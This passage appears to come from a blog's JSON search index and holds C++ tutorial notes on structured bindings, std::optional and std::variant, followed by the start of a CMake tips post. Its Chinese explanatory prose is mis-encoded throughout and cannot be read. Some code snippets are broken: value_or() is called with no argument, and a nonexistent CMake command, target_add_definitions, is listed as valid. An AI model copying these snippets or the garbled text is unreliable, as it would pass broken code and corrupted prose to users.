std::get&lt;0&gt;(tup) &lt;&lt; std::endl; first = 42; std::cout &lt;&lt; std::get&lt;0&gt;(tup) &lt;&lt; std::endl; return 0;&#125; ä¸‡èƒ½æ¨å¯¼ æ³¨æ„ä¸€ä¸‹ä¸‡èƒ½æ¨å¯¼çš„ decltype(auto)ï¼Œç”±äºå†å²åŸå› ï¼Œä»–å¯¹åº”çš„ç»“æ„åŒ–ç»‘å®šæ˜¯ auto &amp;&amp;ã€‚ 12auto &amp;&amp;[x, y, ...] = tup; // æ­£ç¡®ï¼decltype(auto) [x, y, ...] = tup; // é”™è¯¯ï¼ 1234567891011121314#include &lt;iostream&gt;#include &lt;tuple&gt;int main() &#123; auto tup = std::tuple(3, 3.14f, 'h'); auto &amp;&amp;[first, second, third] = tup; std::cout &lt;&lt; std::get&lt;0&gt;(tup) &lt;&lt; std::endl; first = 42; std::cout &lt;&lt; std::get&lt;0&gt;(tup) &lt;&lt; std::endl; return 0;&#125; ç»“æ„åŒ–ç»‘å®šä¸ä»…å¯ä»¥è§£åŒ… std::tupleï¼Œè¿˜å¯ä»¥è§£åŒ…ä»»æ„ç”¨æˆ·è‡ªå®šä¹‰ç±»ã€‚ 12345678910111213141516#include &lt;iostream&gt;#include &lt;tuple&gt;struct MyClass &#123; int x; float y;&#125;;int main() &#123; MyClass mc = &#123;42, 3.14f&#125;; auto [x, y] = mc; std::cout &lt;&lt; x &lt;&lt; \", \" &lt;&lt; y &lt;&lt; std::endl; return 0;&#125; optional 1234567891011121314151617#include &lt;iostream&gt;#include &lt;optional&gt;#include &lt;cmath&gt;std::optional&lt;float&gt; mysqrt(float x) &#123; if (x &gt;= 0.f) &#123; return std::sqrt(x); &#125; else &#123; return std::nullopt; &#125;&#125;int main() &#123; auto ret = mysqrt(-3.14f); printf(\"æˆåŠŸï¼ç»“æœä¸ºï¼š%f\\n\", ret.value()); return 0;&#125; value_or() æ–¹ä¾¿åœ°æŒ‡å®šä¸€ä¸ªç¼ºçœå€¼ï¼š 1234567891011121314151617#include &lt;iostream&gt;#include &lt;optional&gt;#include &lt;cmath&gt;std::optional&lt;float&gt; mysqrt(float x) &#123; if (x &gt;= 0.f) &#123; return std::sqrt(x); &#125; else &#123; return std::nullopt; &#125;&#125;int main() &#123; auto ret = mysqrt(-3.14f); printf(\"æˆåŠŸï¼ç»“æœä¸ºï¼š%f\\n\", ret.value_or()); return 0;&#125; value() ä¼šæ£€æµ‹æ˜¯å¦ä¸ºç©ºï¼Œç©ºåˆ™æŠ›å‡ºå¼‚å¸¸ std::bad_optional_accessï¼š 1234567891011121314151617#include &lt;iostream&gt;#include &lt;optional&gt;#include &lt;cmath&gt;std::optional&lt;float&gt; mysqrt(float x) &#123; if (x &gt;= 0.f) &#123; return std::sqrt(x); &#125; else &#123; return std::nullopt; &#125;&#125;int main() &#123; auto ret = mysqrt(-3.14f); printf(\"æˆåŠŸï¼ç»“æœä¸ºï¼š%f\\n\", ret.value()); return 0;&#125; é™¤äº† ret.value() ä¹‹å¤–è¿˜å¯ä»¥ç”¨ *ret è·å– optional å®¹å™¨ä¸­çš„å€¼ï¼Œä¸è¿‡operator*() ä¸æ£€æµ‹æ˜¯å¦ä¸ºç©ºï¼Œä¸ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œæ›´åŠ é«˜æ•ˆï¼Œä½†æ˜¯è¦æ³¨æ„å®‰å…¨ã€‚ åœ¨ if çš„æ¡ä»¶è¡¨è¾¾å¼ä¸­ï¼Œå…¶å®å¯ä»¥ç›´æ¥å†™ if (ret)ï¼Œä»–å’Œ if (ret.has_value()) ç­‰ä»·ã€‚ nullopt nullopt åˆ™æ¨¡ä»¿ nullptrï¼Œä½†æ˜¯ä»–æ›´å®‰å…¨ï¼Œä¸”ç¬¦åˆ RAII æ€æƒ³ï¼Œå½“è®¾ä¸º nullopt æ—¶ä¼šè‡ªåŠ¨é‡Šæ”¾å†…éƒ¨çš„å¯¹è±¡ã€‚å’Œ unique_ptr çš„åŒºåˆ«åœ¨äºä»–çš„å¯¹è±¡å­˜å‚¨åœ¨æ ˆä¸Šï¼Œæ•ˆç‡æ›´é«˜ã€‚ 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;optional&gt;#include &lt;cmath&gt;std::optional&lt;float&gt; mysqrt(float x) &#123; if (x &gt;= 0.f) &#123; return std::sqrt(x); &#125; else &#123; return std::nullopt; &#125;&#125;int main() &#123; auto ret = mysqrt(-3.14f); if (ret.has_value()) &#123; printf(\"æˆåŠŸï¼ç»“æœä¸ºï¼š%f\\n\", *ret); &#125; else &#123; printf(\"å¤±è´¥ï¼æ‰¾ä¸åˆ°å¹³æ–¹æ ¹ï¼\\n\"); &#125; return 0;&#125; variant å®‰å…¨çš„ unionã€‚å’Œ union ç›¸æ¯”ï¼Œvariant ç¬¦åˆ RAII æ€æƒ³ï¼Œæ›´åŠ å®‰å…¨æ˜“ç”¨ã€‚ image-20220608224818039 è¦è·å–æŸä¸ªç±»å‹çš„å€¼ï¼Œæ¯”å¦‚è¦è·å– int ç”¨ std::getã€‚å¦‚æœå½“å‰ variant é‡Œä¸æ˜¯è¿™ä¸ªç±»å‹ï¼Œå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼šstd::bad_variant_accessã€‚ 12345678910111213141516#include &lt;iostream&gt;#include &lt;variant&gt;int main() &#123; std::variant&lt;int, float&gt; v = 3; std::cout &lt;&lt; std::get&lt;int&gt;(v) &lt;&lt; std::endl; // 3 std::cout &lt;&lt; std::get&lt;0&gt;(v) &lt;&lt; std::endl; // 3 v = 3.14f; std::cout &lt;&lt; std::get&lt;float&gt;(v) &lt;&lt; std::endl; // 3.14f std::cout &lt;&lt; std::get&lt;int&gt;(v) &lt;&lt; std::endl; // è¿è¡Œæ—¶é”™è¯¯ return 0;&#125; å¯ä»¥ç”¨ std::holds_alternative åˆ¤æ–­å½“å‰é‡Œé¢å­˜å‚¨çš„æ˜¯ä¸æ˜¯ intã€‚ 123456789101112131415161718#include &lt;iostream&gt;#include &lt;variant&gt;void print(std::variant&lt;int, float&gt; const &amp;v) &#123; if (std::holds_alternative&lt;int&gt;(v)) &#123; std::cout &lt;&lt; std::get&lt;int&gt;(v) &lt;&lt; std::endl; &#125; else if (std::holds_alternative&lt;float&gt;(v)) &#123; std::cout &lt;&lt; std::get&lt;float&gt;(v) &lt;&lt; std::endl; &#125;&#125;int main() &#123; std::variant&lt;int, float&gt; v = 3; print(v); v = 3.14f; print(v); return 0;&#125; é™¤äº†è¿™ä¸ªä¹‹å¤–ï¼Œè¿˜å¯ä»¥ç”¨æˆå‘˜æ–¹æ³• index() è·å–å½“å‰æ˜¯å‚æ•°åˆ—è¡¨ä¸­çš„ç¬¬å‡ ä¸ªç±»å‹ã€‚ 123456789101112131415161718#include &lt;iostream&gt;#include &lt;variant&gt;void print(std::variant&lt;int, float&gt; const &amp;v) &#123; if (v.index() == 0) &#123; std::cout &lt;&lt; std::get&lt;0&gt;(v) &lt;&lt; std::endl; &#125; else if (v.index() == 1) &#123; std::cout &lt;&lt; std::get&lt;1&gt;(v) &lt;&lt; std::endl; &#125;&#125;int main() &#123; std::variant&lt;int, float&gt; v = 3; print(v); v = 3.14f; print(v); return 0;&#125; æ‰¹é‡åŒ¹é… std::visit å¦‚æœä½ çš„ if-else æ¯ä¸ªåˆ†æ”¯é•¿å¾—éƒ½å·®ä¸å¤šï¼ˆé™¤äº† std::get&lt;&gt; çš„ç±»å‹ä¸ä¸€æ ·ä»¥å¤–ï¼‰ï¼Œå¯ä»¥è€ƒè™‘ç”¨ std::visitï¼Œä»–ä¼šè‡ªåŠ¨ç”¨ç›¸åº”çš„ç±»å‹ï¼Œè°ƒç”¨ä½ çš„ lambdaã€‚ 12345678910111213141516#include &lt;iostream&gt;#include &lt;variant&gt;void print(std::variant&lt;int, float&gt; const &amp;v) &#123; std::visit([&amp;] (auto const &amp;t) &#123; std::cout &lt;&lt; t &lt;&lt; std::endl; &#125;, v);&#125;int main() &#123; std::variant&lt;int, float&gt; v = 3; print(v); v = 3.14f; print(v); return 0;&#125; è¿™é‡Œç”¨åˆ°äº†å¸¦ auto çš„ lambdaï¼Œåˆ©ç”¨äº†ä»–å…·æœ‰å¤šæ¬¡ç¼–è¯‘çš„ç‰¹æ€§ï¼Œå®ç°ç¼–è¯‘å¤šä¸ªåˆ†æ”¯çš„æ•ˆæœã€‚ std::visitã€std::variant çš„è¿™ç§æ¨¡å¼ç§°ä¸ºé™æ€å¤šæ€ï¼Œå’Œè™šå‡½æ•°ã€æŠ½è±¡ç±»çš„åŠ¨æ€å¤šæ€ç›¸å¯¹ã€‚é™æ€å¤šæ€çš„ä¼˜ç‚¹æ˜¯ï¼šæ€§èƒ½å¼€é”€å°ï¼Œå­˜å‚¨å¤§å°å›ºå®šã€‚ç¼ºç‚¹æ˜¯ï¼šç±»å‹å›ºå®šï¼Œä¸èƒ½è¿è¡Œæ—¶æ‰©å……ã€‚ 1234567891011121314151617181920212223#include &lt;iostream&gt;#include &lt;variant&gt;void print(std::variant&lt;int, float&gt; const &amp;v) &#123; std::visit([&amp;] (auto const &amp;t) &#123; std::cout &lt;&lt; t &lt;&lt; std::endl; &#125;, v);&#125;auto add(std::variant&lt;int, float&gt; const &amp;v1, std::variant&lt;int, float&gt; const &amp;v2) &#123; std::variant&lt;int, float&gt; ret; std::visit([&amp;] (auto const &amp;t1, auto const &amp;t2) &#123; ret = t1 + t2; &#125;, v1, v2); return ret;&#125;int main() &#123; std::variant&lt;int, float&gt; v = 3; print(add(v, 3.14f)); return 0;&#125; æ‰€ä»¥å¦‚æœ variant æœ‰ n ä¸ªç±»å‹ï¼Œé‚£ lambda å°±è¦è¢«ç¼–è¯‘ nÂ² æ¬¡ï¼Œç¼–è¯‘å¯èƒ½ä¼šå˜æ…¢ã€‚ä½†æ˜¯æ ‡å‡†åº“èƒ½ä¿è¯è¿è¡Œæ—¶æ˜¯ O(1) çš„ï¼ˆä»–ä»¬ç”¨å‡½æ•°æŒ‡é’ˆå®ç°åˆ†æ”¯ï¼Œä¸æ˜¯æš´åŠ› if-elseï¼‰ã€‚ std::visité‡Œé¢çš„ lambda å¯ä»¥æœ‰è¿”å›å€¼ï¼š 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;variant&gt;void print(std::variant&lt;int, float&gt; const &amp;v) &#123; std::visit([&amp;] (auto const &amp;t) &#123; std::cout &lt;&lt; t &lt;&lt; std::endl; &#125;, v);&#125;auto add(std::variant&lt;int, float&gt; const &amp;v1, std::variant&lt;int, float&gt; const &amp;v2) &#123; return std::visit([&amp;] (auto const &amp;t1, auto const &amp;t2) -&gt; std::variant&lt;int, float&gt; &#123; return t1 + t2; &#125;, v1, v2);&#125;int main() &#123; std::variant&lt;int, float&gt; v = 3; print(add(v, 3.14f)); return 0;&#125;","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"Template","slug":"Template","permalink":"https://racleray.github.io/tags/Template/"}],"author":"HeRui"},{"title":"CMake Tips","slug":"CMake-Tips","date":"2023-05-21T11:11:52.000Z","updated":"2024-01-09T10:19:03.624Z","comments":true,"path":"posts/50880878.html","link":"","permalink":"https://racleray.github.io/posts/50880878.html","excerpt":"CMake ç¬”è®°","text":"Cmake ä¸ºä»€ä¹ˆéœ€è¦æ„å»ºç³»ç»Ÿï¼ˆMakefileï¼‰ å½“æ›´æ–°äº†hello.cppæ—¶åªä¼šé‡æ–°ç¼–è¯‘hello.oï¼Œè€Œä¸éœ€è¦æŠŠmain.oä¹Ÿé‡æ–°ç¼–è¯‘ä¸€é èƒ½å¤Ÿè‡ªåŠ¨å¹¶è¡Œåœ°å‘èµ·å¯¹hello.cppå’Œmain.cppçš„ç¼–è¯‘ï¼ŒåŠ å¿«ç¼–è¯‘é€Ÿåº¦ï¼ˆmake -jï¼‰ ç”¨é€šé…ç¬¦æ‰¹é‡ç”Ÿæˆæ„å»ºè§„åˆ™ï¼Œé¿å…é’ˆå¯¹æ¯ä¸ª.cppå’Œ.oé‡å¤å†™ g++ å‘½ä»¤ï¼ˆ%.o: %.cppï¼‰ ä½†åå¤„ä¹Ÿå¾ˆæ˜æ˜¾ï¼š make åœ¨ Unix ç±»ç³»ç»Ÿä¸Šæ˜¯é€šç”¨çš„ï¼Œä½†åœ¨ Windows åˆ™ä¸ç„¶ã€‚ éœ€è¦å‡†ç¡®åœ°æŒ‡æ˜æ¯ä¸ªé¡¹ç›®ä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼Œæœ‰å¤´æ–‡ä»¶æ—¶ç‰¹åˆ«å¤´ç–¼ã€‚ make çš„è¯­æ³•éå¸¸ç®€å•ï¼Œä¸åƒ shell æˆ– python å¯ä»¥åšå¾ˆå¤šåˆ¤æ–­ç­‰ã€‚ ä¸åŒçš„ç¼–è¯‘å™¨æœ‰ä¸åŒçš„ flag è§„åˆ™ï¼Œä¸º g++ å‡†å¤‡çš„å‚æ•°å¯èƒ½å¯¹ MSVC ä¸é€‚ç”¨ã€‚ æ„å»ºç³»ç»Ÿçš„æ„å»ºç³»ç»Ÿï¼ˆCMakeï¼‰ ä¸ºäº†è§£å†³ make çš„ä»¥ä¸Šé—®é¢˜ï¼Œè·¨å¹³å°çš„ CMake åº”è¿è€Œç”Ÿï¼ åªéœ€è¦å†™ä¸€ä»½ CMakeLists.txtï¼Œä»–å°±èƒ½å¤Ÿåœ¨è°ƒç”¨æ—¶ç”Ÿæˆå½“å‰ç³»ç»Ÿæ‰€æ”¯æŒçš„æ„å»ºç³»ç»Ÿã€‚ CMake å¯ä»¥è‡ªåŠ¨æ£€æµ‹æºæ–‡ä»¶å’Œå¤´æ–‡ä»¶ä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼Œå¯¼å‡ºåˆ° Makefile é‡Œã€‚ CMake å…·æœ‰ç›¸å¯¹é«˜çº§çš„è¯­æ³•ï¼Œå†…ç½®çš„å‡½æ•°èƒ½å¤Ÿå¤„ç† configureï¼Œinstall ç­‰å¸¸è§éœ€æ±‚ã€‚ CMake 3.x ï¼ˆç°ä»£ï¼‰ç›¸æ¯” 2.x ï¼ˆå¤ä»£ï¼‰æœ‰æ‰€ä¸åŒï¼š ç°ä»£ CMake å’Œå¤ä»£ CMake ç›¸æ¯”ï¼Œä½¿ç”¨æ›´æ–¹ä¾¿ï¼ŒåŠŸèƒ½æ›´å¼ºå¤§ã€‚ CMake å¯ä»¥è‡ªåŠ¨æ£€æµ‹å½“å‰çš„ç¼–è¯‘å™¨éœ€è¦æ·»åŠ å“ªäº› flagã€‚æ¯”å¦‚ OpenMPï¼Œåªéœ€è¦åœ¨ CMakeLists.txt ä¸­æŒ‡æ˜ target_link_libraries(a.out OpenMP::OpenMP_CXX) å³å¯ã€‚ CMake å®˜æ–¹æ–‡æ¡£ CMake â€œèœè°±â€ C++ æ ¸å¿ƒå¼€å‘è§„èŒƒ CMake çš„å‘½ä»¤è¡Œè°ƒç”¨ ç°ä»£ CMake æä¾›äº†æ›´æ–¹ä¾¿çš„ -B å’Œ --build æŒ‡ä»¤ï¼Œä¸åŒå¹³å°ï¼Œç»Ÿä¸€å‘½ä»¤ï¼š 123456# ç¬¬ä¸€æ­¥ç§°ä¸ºé…ç½®é˜¶æ®µï¼ˆconfigureï¼‰ï¼Œè¿™æ—¶åªæ£€æµ‹ç¯å¢ƒå¹¶ç”Ÿæˆæ„å»ºè§„åˆ™cmake -B build # åœ¨æºç ç›®å½•ç”¨ -B ç›´æ¥åˆ›å»º build ç›®å½•å¹¶ç”Ÿæˆ build/Makefile# ç¬¬äºŒæ­¥ç§°ä¸ºæ„å»ºé˜¶æ®µï¼ˆbuildï¼‰ï¼Œè¿™æ—¶æ‰å®é™…è°ƒç”¨ç¼–è¯‘å™¨æ¥ç¼–è¯‘ä»£ç cmake --build build -j4 # è‡ªåŠ¨è°ƒç”¨æœ¬åœ°çš„æ„å»ºç³»ç»Ÿåœ¨ build é‡Œæ„å»ºï¼Œå³ï¼šmake -C build -j4sudo cmake --build build --target install # è°ƒç”¨æœ¬åœ°çš„æ„å»ºç³»ç»Ÿæ‰§è¡Œ install è¿™ä¸ªç›®æ ‡ cmake -B build å…å»äº†å…ˆåˆ›å»º build ç›®å½•å†åˆ‡æ¢è¿›å»å†æŒ‡å®šæºç ç›®å½•çš„éº»çƒ¦ã€‚ cmake --build build ç»Ÿä¸€äº†ä¸åŒå¹³å°ï¼ˆLinux ä¸Šä¼šè°ƒç”¨ makeï¼ŒWindows ä¸Šè°ƒç”¨ devenv.exeï¼‰ã€‚ é…ç½®é˜¶æ®µå¯ä»¥é€šè¿‡ -D è®¾ç½®ç¼“å­˜å˜é‡ã€‚ç¬¬äºŒæ¬¡é…ç½®æ—¶ï¼Œä¹‹å‰çš„ -D æ·»åŠ ä»ç„¶ä¼šè¢«ä¿ç•™ã€‚ 12cmake -B build -DCMAKE_BUILD_TYPE=Release # è®¾ç½®æ„å»ºæ¨¡å¼ä¸ºå‘å¸ƒæ¨¡å¼ï¼ˆå¼€å¯å…¨éƒ¨ä¼˜åŒ–ï¼‰cmake -B build # ç¬¬äºŒæ¬¡é…ç½®æ—¶æ²¡æœ‰ -D å‚æ•°ï¼Œä½†æ˜¯ä¹‹å‰çš„ -D è®¾ç½®çš„å˜é‡éƒ½ä¼šè¢«ä¿ç•™ -G é€‰é¡¹ï¼šæŒ‡å®šè¦ç”¨çš„ç”Ÿæˆå™¨ã€‚Linux ç³»ç»Ÿä¸Šçš„ CMake é»˜è®¤ç”¨æ˜¯ Unix Makefiles ç”Ÿæˆå™¨ï¼›Windows ç³»ç»Ÿé»˜è®¤æ˜¯ Visual Studio 2019 ç”Ÿæˆå™¨ï¼›MacOS ç³»ç»Ÿé»˜è®¤æ˜¯ Xcode ç”Ÿæˆå™¨ã€‚ å¯ä»¥ç”¨ -G å‚æ•°æ”¹ç”¨åˆ«çš„ç”Ÿæˆå™¨ï¼Œä¾‹å¦‚ cmake -GNinja ä¼šç”Ÿæˆ Ninja è¿™ä¸ªæ„å»ºç³»ç»Ÿçš„æ„å»ºè§„åˆ™ã€‚Ninja æ˜¯ä¸€ä¸ªé«˜æ€§èƒ½ï¼Œè·¨å¹³å°çš„æ„å»ºç³»ç»Ÿï¼ŒLinuxã€Windowsã€MacOS ä¸Šéƒ½å¯ä»¥ç”¨ã€‚Ninja åˆ™æ˜¯ä¸“ä¸ºæ€§èƒ½ä¼˜åŒ–çš„æ„å»ºç³»ç»Ÿï¼Œä»–å’Œ CMake ç»“åˆéƒ½æ˜¯è¡Œä¸šæ ‡å‡†äº†ã€‚ æ€§èƒ½ä¸Šï¼šNinja &gt; Makefile &gt; MSBuildã€‚ 1cmake -GNinja -B build è¯»å–å½“å‰ç›®å½•çš„ CMakeLists.txtï¼Œå¹¶åœ¨ build æ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆ build/Makefileï¼š cmake -Bbuild è®© make è¯»å– build/Makefileï¼Œå¹¶å¼€å§‹æ„å»º a.outï¼š make -C build ä»¥ä¸‹å‘½ä»¤å’Œä¸Šä¸€ä¸ªç­‰ä»·ï¼Œä½†æ›´è·¨å¹³å°ï¼š cmake --build build æ‰§è¡Œç”Ÿæˆçš„ build/a.out. ç¤ºä¾‹ï¼š hello.cpp 12345#include &lt;cstdio&gt;void hello() &#123; printf(\"Hello, world\\n\");&#125; main.cpp 12345678#include &lt;cstdio&gt;void hello();int main() &#123; hello(); return 0;&#125; å¤šç§ç¼–è¯‘ç»„ç»‡æ–¹å¼ æ™®é€šç¼–è¯‘ 1234cmake_minimum_required(VERSION 3.12)project(hellocmake LANGUAGES CXX)add_executable(a.out main.cpp hello.cpp) é™æ€åº“ é™¤äº† add_executable å¯ä»¥ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡ add_library ç”Ÿæˆåº“æ–‡ä»¶ã€‚ ç”Ÿæˆé™æ€åº“ hellolib.aã€‚ è¦åœ¨æŸä¸ªå¯æ‰§è¡Œæ–‡ä»¶ä¸­ä½¿ç”¨è¯¥åº“ï¼Œåªéœ€è¦ï¼š target_link_libraries(a.out PUBLIC hellolib) # ä¸º a.out é“¾æ¥åˆšåˆšåˆ¶ä½œçš„åº“ hellolib.a 123456cmake_minimum_required(VERSION 3.12)project(hellocmake LANGUAGES CXX)add_library(hellolib STATIC hello.cpp)add_executable(a.out main.cpp)target_link_libraries(a.out PUBLIC hellolib) åŠ¨æ€åº“ ç”Ÿæˆé™æ€åº“ hellolib.so 123456cmake_minimum_required(VERSION 3.12)project(hellocmake LANGUAGES CXX)add_library(hellolib SHARED hello.cpp)add_executable(a.out main.cpp)target_link_libraries(a.out PUBLIC hellolib) å¯¹è±¡åº“ 123456cmake_minimum_required(VERSION 3.12)project(hellocmake LANGUAGES CXX)add_library(hellolib OBJECT hello.cpp)add_executable(a.out main.cpp)target_link_libraries(a.out PUBLIC hellolib) å¯¹è±¡åº“ç±»ä¼¼äºé™æ€åº“ï¼Œä½†ä¸ç”Ÿæˆ .a æ–‡ä»¶ï¼Œåªç”± CMake è®°ä½è¯¥åº“ç”Ÿæˆäº†å“ªäº›å¯¹è±¡æ–‡ä»¶ã€‚ å¯¹è±¡åº“æ˜¯ CMake è‡ªåˆ›çš„ï¼Œç»•å¼€äº†ç¼–è¯‘å™¨å’Œæ“ä½œç³»ç»Ÿçš„å„ç§ç¹çè§„åˆ™ï¼Œä¿è¯äº†è·¨å¹³å°ç»Ÿä¸€æ€§ã€‚ å¯¹è±¡åº“å¯ä¿è¯ä¸ä¼šè‡ªåŠ¨å‰”é™¤æ²¡å¼•ç”¨åˆ°çš„å¯¹è±¡æ–‡ä»¶ã€‚è€Œé™æ€åº“ä¼šè‡ªåŠ¨å‰”é™¤ã€‚ åŠ¨æ€åº“ä¸­é“¾æ¥é™æ€åº“ è®©é™æ€åº“ç¼–è¯‘æ—¶ä¹Ÿç”Ÿæˆä½ç½®æ— å…³çš„ä»£ç (PIC)ï¼Œè¿™æ ·æ‰èƒ½è£…åœ¨åŠ¨æ€åº“é‡Œã€‚ 12345678add_library(otherlib STATIC otherlib.cpp)set_property(TARGET otherlib PROPERTY POSITION_INDEPENDENT_CODE ON)add_library(mylib SHARED mylib.cpp)target_link_libraries(mylib PUBLIC otherlib)add_executable(main main.cpp)target_link_libraries(main PUBLIC mylib) PUBLIC è¡¨ç¤ºæ‰€æœ‰ä¾èµ–libçš„targetéƒ½è‡ªåŠ¨ç»‘å®šäº†è¯¥å¤´æ–‡ä»¶è·¯å¾„ PRIVATE è¡¨ç¤ºè¯¥å¤´æ–‡ä»¶è·¯å¾„ä»…å¯¹æœ¬targetæœ‰æ•ˆ INTERFACE è¡¨ç¤ºè¯¥å¤´æ–‡ä»¶è·¯å¾„ä»…å¯¹ä¾èµ–è¯¥libçš„targetç”Ÿæ•ˆ PUBLIC = PRIVATE + INTERFACE å­æ¨¡å— æœ‰å·¥ç¨‹æ–‡ä»¶ï¼š 12345678â”œâ”€ hellolibâ”‚ â”œâ”€ CMakeLists.txtâ”‚ â”œâ”€ hello.cppâ”‚ â””â”€ hello.hâ”œâ”€ CMakeLists.txtâ”œâ”€ main.cppâ”œâ”€ r.mdâ””â”€ run.sh cmakeæ–‡ä»¶ï¼š 1234567cmake_minimum_required(VERSION 3.12)project(hellocmake LANGUAGES CXX)add_subdirectory(hellolib)add_executable(a.out main.cpp)target_link_libraries(a.out PUBLIC hellolib) å­ç›®å½•ä¸‹ï¼Œcmakeæ–‡ä»¶ï¼š 1add_library(hellolib STATIC hello.cpp) add_subdirectory æ·»åŠ å­ç›®å½•ï¼Œå­ç›®å½•ä¹ŸåŒ…å«ä¸€ä¸ª CMakeLists.txtï¼Œå…¶ä¸­å®šä¹‰çš„åº“åœ¨ add_subdirectory ä¹‹åå°±å¯ä»¥åœ¨ä¸»ç›®å½•çš„æ–‡ä»¶ä¸­ä½¿ç”¨ã€‚ å¦‚æœæŒ‡å®šå¤´æ–‡ä»¶æœç´¢ç›®å½•ï¼š 12345678cmake_minimum_required(VERSION 3.12)project(hellocmake LANGUAGES CXX)add_subdirectory(hellolib)add_executable(a.out main.cpp)target_link_libraries(a.out PUBLIC hellolib)target_include_directories(a.out PUBLIC hellolib) è¿™æ ·ç”šè‡³å¯ä»¥ç”¨ &lt;hello.h&gt; æ¥å¼•ç”¨è¿™ä¸ªå¤´æ–‡ä»¶äº†ï¼Œå› ä¸ºé€šè¿‡ target_include_directories æŒ‡å®šçš„è·¯å¾„ä¼šè¢«è§†ä¸ºä¸ç³»ç»Ÿè·¯å¾„ç­‰ä»·ã€‚è¿™é‡ŒæŒ‡å®šäº† hellolib æ–‡ä»¶å¤¹åç§°ã€‚ target_link_libraries(a.out PUBLIC hellolib) ä¸­çš„ hellolib ä¸ºå­æ¨¡å—çš„åº“åã€‚ ä½†æ˜¯å¦‚æœæœ‰ b.out ä¹Ÿå¼•ç”¨äº† hellolibï¼š 12target_include_directories(a.out PUBLIC hellolib)target_include_directories(b.out PUBLIC hellolib) è¦é‡å¤æŒ‡å®šè·¯å¾„å—ï¼Ÿ å…¶å®åªéœ€è¦åœ¨ hellolib æ–‡ä»¶å¤¹ä¸‹çš„ cmakelists.txt ä¸­æŒ‡å®š hellolib (åº“å) çš„æ–‡ä»¶è·¯å¾„ï¼Œè®¾ä¸º PUBLIC ï¼Œè®©ä½¿ç”¨åˆ° hellolib çš„å¯æ‰§è¡Œæ–‡ä»¶è‡ªåŠ¨æ·»åŠ æœç´¢è·¯å¾„å³å¯ã€‚ 12add_library(hellolib STATIC hello.cpp)target_include_directories(hellolib PUBLIC .) æ­¤æ—¶ä¸»ç›®å½•ä¸‹çš„ cmakelists.txt ï¼š 1234567cmake_minimum_required(VERSION 3.12)project(hellocmake LANGUAGES CXX)add_subdirectory(hellolib)add_executable(a.out main.cpp)target_link_libraries(a.out PUBLIC hellolib) ä¸éœ€è¦ target_include_directories è®¾ç½®äº†ã€‚ å…¶ä»–é€‰é¡¹ 12345678910target_include_directories(myapp PUBLIC /usr/include/eigen3) # æ·»åŠ å¤´æ–‡ä»¶æœç´¢ç›®å½•target_link_libraries(myapp PUBLIC hellolib) # æ·»åŠ è¦é“¾æ¥çš„åº“target_add_definitions(myapp PUBLIC MY_MACRO=1) # æ·»åŠ ä¸€ä¸ªå®å®šä¹‰target_add_definitions(myapp PUBLIC -DMY_MACRO=1) # ä¸ä¸Šä¸€ä¸ªç­‰ä»·target_compile_options(myapp PUBLIC -fopenmp) # æ·»åŠ ç¼–è¯‘å™¨å‘½ä»¤è¡Œé€‰é¡¹# å½“ä½¿ç”¨äº† PUBLIC ï¼Œé“¾æ¥äº† myapp çš„æ–‡ä»¶ç¼–è¯‘ä¼šè‡ªåŠ¨åŠ ä¸Š -fopenmptarget_sources(myapp PUBLIC hello.cpp other.cpp) # æ·»åŠ è¦ç¼–è¯‘çš„æºæ–‡ä»¶ ä»¥åŠå¯ä»¥é€šè¿‡ä¸‹åˆ—æŒ‡ä»¤ï¼ˆä¸æ¨èä½¿ç”¨ï¼‰ï¼ŒæŠŠé€‰é¡¹åŠ åˆ°æ‰€æœ‰æ¥ä¸‹æ¥çš„ç›®æ ‡å»ï¼š 1234include_directories(/opt/cuda/include) # æ·»åŠ å¤´æ–‡ä»¶æœç´¢ç›®å½•åˆ° cmakelists.txt ä¸‹æ–‡å®šä¹‰çš„æ‰€æœ‰ç›®æ ‡æ–‡ä»¶link_directories(/opt/cuda) # æ·»åŠ åº“æ–‡ä»¶çš„æœç´¢è·¯å¾„åˆ° cmakelists.txt ä¸‹æ–‡å®šä¹‰çš„æ‰€æœ‰ç›®æ ‡æ–‡ä»¶add_definitions(MY_MACRO=1) # æ·»åŠ ä¸€ä¸ªå®å®šä¹‰åˆ° cmakelists.txt ä¸‹æ–‡å®šä¹‰çš„æ‰€æœ‰ç›®æ ‡æ–‡ä»¶add_compile_options(-fopenmp) # æ·»åŠ ç¼–è¯‘å™¨å‘½ä»¤è¡Œé€‰é¡¹åˆ° cmakelists.txt ä¸‹æ–‡å®šä¹‰çš„æ‰€æœ‰ç›®æ ‡æ–‡ä»¶ ç¬¬ä¸‰æ–¹åº“ çº¯å¤´æ–‡ä»¶åº“ æœ€å‹å¥½çš„ä¸€ç±»åº“è«è¿‡äºçº¯å¤´æ–‡ä»¶åº“äº†ï¼Œè¿™é‡Œæ˜¯ä¸€äº›å¥½ç”¨çš„ header-only åº“ï¼š nothings/stb - å¤§åé¼é¼çš„ stb_image ç³»åˆ—ï¼Œæ¶µç›–å›¾åƒï¼Œå£°éŸ³ï¼Œå­—ä½“ç­‰ï¼Œåªéœ€å•å¤´æ–‡ä»¶ï¼ Neargye/magic_enum - æšä¸¾ç±»å‹çš„åå°„ï¼Œå¦‚æšä¸¾è½¬å­—ç¬¦ä¸²ç­‰ï¼ˆå®ç°æ–¹å¼å¾ˆå·§å¦™ï¼‰ g-truc/glm - æ¨¡ä»¿ GLSL è¯­æ³•çš„æ•°å­¦çŸ¢é‡/çŸ©é˜µåº“ï¼ˆé™„å¸¦ä¸€äº›å¸¸ç”¨å‡½æ•°ï¼Œéšæœºæ•°ç”Ÿæˆç­‰ï¼‰ Tencent/rapidjson - å•çº¯çš„ JSON åº“ï¼Œç”šè‡³æ²¡ä¾èµ– STLï¼ˆå¯å®šåˆ¶æ€§é«˜ï¼Œå·¥ç¨‹ç¾å­¦ç»å…¸ï¼‰ ericniebler/range-v3 - C++20 ranges 